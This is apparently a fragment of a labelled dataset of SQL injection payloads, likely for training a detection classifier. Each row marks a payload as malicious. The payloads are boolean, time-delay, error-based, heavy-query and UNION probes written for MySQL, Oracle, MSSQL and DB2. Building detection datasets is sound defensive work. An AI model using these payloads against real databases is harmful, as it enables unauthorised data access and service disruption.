row_index,payload_norm,label,sqli_type_hint
2040,"-9057"" ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,
2041,"1' ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( 'iixp' = 'iixp",1,
2042,1 ) ) ) and 6467 = 1864#,1,
2043,"1', ( select ( case when ( 1392 = 1380 ) then 1 else 1392* ( select 1392 from master..sysdatabases ) end ) )",1,
2044,1'|| ( select 'xhcr' from dual where 9279 = 9279,1,
2045,-4323' ) ) or 6968 = 1393,1,
2046,"1'+ ( select gajr where 6653 = 6653 union all select null,null,null,null#",1,
2047,-5350 ) ) or 9323 = 9323#,1,
2048,"1' ) ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ( 'nsji' = 'nsji",1,
2049,"1%"" ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
2050,"-5132%"" ) ) or 3038 = 3038",1,
2051,"1' in boolean mode ) and make_set ( 7804 = 3315,3315 ) #",1,
2052,"1"" and 1668 = 8288",1,
2053,"-9821 ) as qqrm where 7152 = 7152 union all select 7152,7152,7152,7152--",1,
2054,"1"" and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ""wtkx"" = ""wtkx",1,
2055,1' ) rlike sleep ( 5 ) and ( 'tslp' = 'tslp,1,
2056,"1"" ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ""zvew"" like ""zvew",1,
2057,select sleep ( 5 ) and ( ( 'keoy' = 'keoy,1,
2058,1' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 'njge' like 'njge,1,
2059,"1' ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( 'rpof' like 'rpof",1,
2060,1 ) where 2543 = 2543,1,
2061,1 and 6802 = 3592--,1,
2062,"1 ) and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
2063,"1' ) and elt ( 4249 = 4249,7259 ) and ( 'bkag' = 'bkag",1,
2064,"1' ) ) as xebq where 7959 = 7959 union all select null,null,null,null,null,null#",1,
2065,"1' ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( 'cpfn' like 'cpfn",1,
2066,1' ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ),1,
2067,"1"" ) ) as gawq where 4728 = 4728 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
2068,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'conm' like 'conm",1,
2069,-3688'|| ( select 'pber' from dual where 7137 = 7137 order by 1#,1,
